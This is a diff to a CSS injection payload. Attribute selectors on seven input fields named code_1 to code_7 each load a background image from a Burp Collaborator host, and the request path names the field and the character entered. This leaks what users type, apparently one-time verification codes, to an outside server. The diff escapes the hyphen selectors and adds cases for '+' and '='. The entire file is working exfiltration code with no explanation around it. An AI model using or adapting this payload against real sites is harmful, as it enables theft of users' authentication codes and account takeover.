@@ -123,8 +123,8 @@ input[name=code_1][value=9]{
 input[name=code_1][value=\.]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_\.");
 }
-input[name=code_1][value=-]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_-");
+input[name=code_1][value=\-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_\-");
 }
 input[name=code_1][value=_]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1__");
@@ -218,6 +218,12 @@ input[name=code_1][value=\|]{
 }
 input[name=code_1][value=\/]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_\/");
+}
+input[name=code_1][value=\+]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_\+");
+}
+input[name=code_1][value=\=]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_\=");
 }
 input[name=code_2][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_a");
@@ -330,8 +336,8 @@ input[name=code_2][value=9]{
 input[name=code_2][value=\.]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_\.");
 }
-input[name=code_2][value=-]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_-");
+input[name=code_2][value=\-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_\-");
 }
 input[name=code_2][value=_]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2__");
@@ -425,6 +431,12 @@ input[name=code_2][value=\|]{
 }
 input[name=code_2][value=\/]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_\/");
+}
+input[name=code_2][value=\+]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_\+");
+}
+input[name=code_2][value=\=]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_\=");
 }
 input[name=code_3][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_a");
@@ -537,8 +549,8 @@ input[name=code_3][value=9]{
 input[name=code_3][value=\.]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_\.");
 }
-input[name=code_3][value=-]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_-");
+input[name=code_3][value=\-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_\-");
 }
 input[name=code_3][value=_]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3__");
@@ -632,6 +644,12 @@ input[name=code_3][value=\|]{
 }
 input[name=code_3][value=\/]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_\/");
+}
+input[name=code_3][value=\+]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_\+");
+}
+input[name=code_3][value=\=]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_\=");
 }
 input[name=code_4][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_a");
@@ -744,8 +762,8 @@ input[name=code_4][value=9]{
 input[name=code_4][value=\.]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_\.");
 }
-input[name=code_4][value=-]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_-");
+input[name=code_4][value=\-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_\-");
 }
 input[name=code_4][value=_]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4__");
@@ -839,6 +857,12 @@ input[name=code_4][value=\|]{
 }
 input[name=code_4][value=\/]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_\/");
+}
+input[name=code_4][value=\+]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_\+");
+}
+input[name=code_4][value=\=]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_\=");
 }
 input[name=code_5][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_a");
@@ -951,8 +975,8 @@ input[name=code_5][value=9]{
 input[name=code_5][value=\.]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_\.");
 }
-input[name=code_5][value=-]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_-");
+input[name=code_5][value=\-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_\-");
 }
 input[name=code_5][value=_]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5__");
@@ -1046,6 +1070,12 @@ input[name=code_5][value=\|]{
 }
 input[name=code_5][value=\/]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_\/");
+}
+input[name=code_5][value=\+]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_\+");
+}
+input[name=code_5][value=\=]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_\=");
 }
 input[name=code_6][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_a");
@@ -1158,8 +1188,8 @@ input[name=code_6][value=9]{
 input[name=code_6][value=\.]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_\.");
 }
-input[name=code_6][value=-]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_-");
+input[name=code_6][value=\-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_\-");
 }
 input[name=code_6][value=_]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6__");
@@ -1253,6 +1283,12 @@ input[name=code_6][value=\|]{
 }
 input[name=code_6][value=\/]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_\/");
+}
+input[name=code_6][value=\+]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_\+");
+}
+input[name=code_6][value=\=]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_\=");
 }
 input[name=code_7][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_a");
@@ -1365,8 +1401,8 @@ input[name=code_7][value=9]{
 input[name=code_7][value=\.]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_\.");
 }
-input[name=code_7][value=-]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_-");
+input[name=code_7][value=\-]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_\-");
 }
 input[name=code_7][value=_]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7__");
@@ -1460,4 +1496,10 @@ input[name=code_7][value=\|]{
 }
 input[name=code_7][value=\/]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_\/");
+}
+input[name=code_7][value=\+]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_\+");
+}
+input[name=code_7][value=\=]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_\=");
 }
